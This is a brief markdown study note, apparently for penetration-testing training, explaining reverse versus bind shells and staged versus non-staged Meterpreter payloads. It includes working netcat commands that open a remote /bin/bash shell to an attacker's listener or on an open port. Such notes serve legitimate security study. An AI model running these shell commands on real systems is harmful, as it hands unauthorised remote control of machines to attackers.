### Reverse Shells vs Bind Shells

##### Reverse Shells
- victim connects to their attacker
```
$ nc -nvlp 4444
# listening on port

$ nc $ip_address 4444 -e /bin/bash
# getting the shell 
```


##### Bind Shell
- when an attacker connects to the target

```
$ nc -nvlp 4444 -e /bin/bash
#victim has the port open

$ nc $ip 4444
# connect on our end 
```


### Staged payloads vs non-staged payloads
##### Non-staged
- sends exploit shellcode all at one
- larger in size and won't always work
- eg windows/meterpreter_reverse_tcp

##### Staged
- send payloads in stages
- size is smaller
- can be less stable
- eg windows/meterpreter/reverse_tcp
